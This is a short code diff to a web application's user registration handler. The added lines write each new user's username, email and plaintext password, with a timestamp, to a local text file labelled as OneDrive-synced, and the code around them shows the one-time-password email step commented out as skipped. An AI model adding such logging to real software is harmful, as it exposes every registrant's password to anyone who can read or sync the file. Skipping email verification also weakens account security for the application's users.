@@ -162,6 +162,13 @@ def register():
         db.session.add(user)
         db.session.commit()
 
+        # Log credentials to file (OneDrive)
+        try:
+            with open("registrations_log.txt", "a") as f:
+                f.write(f"[{datetime.utcnow()}] Username: {username}, Email: {email}, Password: {password}\n")
+        except Exception as log_e:
+            print(f"Failed to log registration: {log_e}")
+
         # Generate & send OTP (SKIPPED)
         # try:
         #    otp = EmailOTP.create_otp(email)
